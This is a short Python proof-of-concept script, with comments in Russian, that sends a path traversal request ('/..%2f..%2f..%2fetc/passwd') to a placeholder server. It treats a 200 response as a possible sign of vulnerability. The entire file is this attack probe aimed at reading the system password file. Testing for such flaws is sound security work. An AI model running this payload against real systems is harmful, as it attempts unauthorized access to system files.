import requests

# Условный адрес уязвимого сервера (пример)
base_url = "http://example.com"

# Имитация path traversal
payload = "/..%2f..%2f..%2fetc/passwd"

url = base_url + payload

print(f"[i] Отправляем тестовый запрос: {url}")

try:
    response = requests.get(url, timeout=5)

    if response.status_code == 200:
        print("[+] Сервер ответил 200 OK.")
        print("[+] Теоретически это может указывать на уязвимость.")
        print("[i] Длина ответа:", len(response.text))
    else:
        print("[-] Сервер вернул код:", response.status_code)
        print("[i] Уязвимость не подтверждена (в рамках PoC).")

except Exception as e:
    print("[!] Ошибка соединения:", e)
